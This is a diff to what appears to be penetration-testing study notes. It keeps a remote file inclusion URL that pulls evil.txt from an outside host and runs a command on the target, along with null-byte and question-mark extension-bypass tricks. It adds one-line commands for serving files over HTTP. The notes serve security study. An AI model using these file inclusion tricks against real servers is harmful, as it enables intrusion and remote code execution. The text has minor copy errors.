@@ -720,4 +720,13 @@ http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
 
 File inclusion tricks:
 - Older versions of PHP have a vulnerability in which a null byte278 (%00) will terminate any string. This trick can be used to bypass file extensions added server-side and is useful for file inclusions because it prevents the file extension from being considered as part of the string. 
-End the file extension with a them with a question mark (?) to mark anything added to the URL server-side as part of the query string. 
+- End the file extension with a them with a question mark (?) to mark anything added to the URL server-side as part of the query string.
+
+### Web server one-liners
+```
+python -m SimpleHTTPServer 7331]
+python3 -m http.server 7331
+php -S 0.0.0.0:8000
+ruby -run -e httpd . -p 9000
+busybox httpd -f -p 10000
+```
